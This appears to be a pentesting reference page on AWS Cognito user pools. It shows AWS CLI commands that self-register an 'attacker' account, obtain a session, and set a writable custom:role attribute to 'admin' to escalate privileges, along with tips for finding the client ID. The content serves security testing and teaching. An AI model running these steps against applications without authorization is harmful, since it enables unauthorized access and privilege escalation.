---
title: "User pool: self-signup and writable attributes"
description: "Abusing open user-pool self-signup and writable user attributes to gain or elevate access."
keywords:
  - Cognito
  - user pool
  - self-signup
  - attributes
  - sign-up
---

# User pool

A Cognito user pool is the directory of application accounts. When self-signup is enabled, anyone can enroll and obtain a valid session; when attributes the app trusts for authorization are **writable** by the user, you set them to elevate.

## Enroll yourself

```bash
aws cognito-idp sign-up --client-id <app-client-id> \
  --username attacker --password 'Passw0rd!' \
  --user-attributes Name=email,Value=a@you.example
aws cognito-idp initiate-auth --client-id <app-client-id> \
  --auth-flow USER_PASSWORD_AUTH \
  --auth-parameters USERNAME=attacker,PASSWORD='Passw0rd!'
```

## Attribute abuse

If a `custom:` attribute (role, tenant, is_admin) is in the client's writable set, update it to a privileged value:

```bash
aws cognito-idp update-user-attributes --access-token <token> \
  --user-attributes Name=custom:role,Value=admin
```

## Exploitation notes

- The app client ID is a client-side value; pull it from the front end.
- Auto-verified email or phone can let signup complete without a real inbox depending on configuration.
- Writable authorization attributes are the high-value case: the app trusts a value the user controls.

## Tools

- **AWS CLI** (`cognito-idp sign-up` / `initiate-auth` / `update-user-attributes`).

## References

- [HackTricks Cloud: AWS Cognito user pools](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-cognito-enum/index.html)
- [AWS: Cognito user pools](https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-identity-pools.html)
